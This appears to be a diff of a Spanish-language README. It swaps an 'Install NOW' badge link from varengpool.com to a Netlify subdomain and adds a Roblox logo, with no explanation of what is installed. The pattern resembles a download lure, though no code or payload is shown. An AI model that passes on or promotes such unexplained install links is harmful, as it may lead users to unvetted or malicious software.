@@ -8,7 +8,7 @@
 **Explorar**  
 Visita nuestro proyecto **InicioNort** para comenzar.  
 
-- [![InstallUpdatingSetup](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 
 ---
 
